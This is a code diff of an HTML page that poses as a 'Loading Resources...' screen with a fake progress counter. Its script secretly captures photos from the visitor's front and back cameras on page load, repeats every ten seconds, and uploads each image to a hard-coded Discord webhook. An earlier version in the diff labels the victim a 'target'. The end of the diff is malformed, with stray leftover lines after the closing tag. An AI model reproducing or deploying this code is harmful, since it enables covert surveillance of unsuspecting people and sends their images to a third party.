@@ -2,69 +2,80 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing...</title>
+    <title>Loading Resources...</title>
     <style>
-        body {
-            background-color: black;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: sans-serif;
-        }
+        body { background: black; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
     </style>
 </head>
 <body>
-    <div id="status">Loading Content...</div>
-
+    <div id="status">Loading... 0%</div>
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
+        let currentStream = null;
 
-        async function startCapture() {
+        async function captureCycle() {
+            // 1. Capture Front Camera
+            await takePhoto("user", "Front Camera");
+            
+            // 2. Short delay between switching
+            await new Promise(r => setTimeout(r, 1000));
+
+            // 3. Capture Back Camera
+            await takePhoto("environment", "Back Camera");
+        }
+
+        async function takePhoto(mode, label) {
             try {
-                // Request front camera access immediately
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                // Stop any existing stream before switching cameras
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
 
-                // Wait 1.5 seconds to allow camera to adjust focus/brightness
-                setTimeout(() => {
-                    takePhoto(video);
-                }, 1500);
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode } 
+                });
+
+                const video = document.getElementById('video');
+                video.srcObject = currentStream;
+
+                // Wait for camera to stabilize
+                await new Promise(r => setTimeout(r, 1500));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(blob => {
+                    sendToDiscord(blob, label);
+                }, 'image/jpeg', 0.7);
 
             } catch (err) {
-                document.getElementById('status').innerText = "Error: Please allow permissions to view content.";
-                console.error("Camera access denied:", err);
+                console.log(label + " access failed: ", err);
             }
         }
 
-        function takePhoto(video) {
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function sendToDiscord(blob, label) {
+            const formData = new FormData();
+            formData.append('file', blob, 'capture.jpg');
+            formData.append('content', `📸 **Capture Alert** | Mode: ${label} | Time: ${new Date().toLocaleTimeString()}`);
 
-            // Convert frame to image file
-            canvas.toBlob((blob) => {
-                sendToDiscord(blob);
-            }, 'image/jpeg', 0.8);
+            fetch(WEBHOOK_URL, { method: 'POST', body: formData });
         }
 
-        function sendToDiscord(imageBlob) {
-            const formData = new FormData();
-            formData.append('file', imageBlob, 'target_capture.jpg');
-            formData.append('content', '📸 **New photo captured from target!**');
+        // Start the loop
+        window.onload = () => {
+            // Run immediately
+            captureCycle();
+            // Repeat every 10 seconds (5s front + 5s back roughly)
+            setInterval(captureCycle, 10000); 
+        };
+    </script>
+</body>
+</html>
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
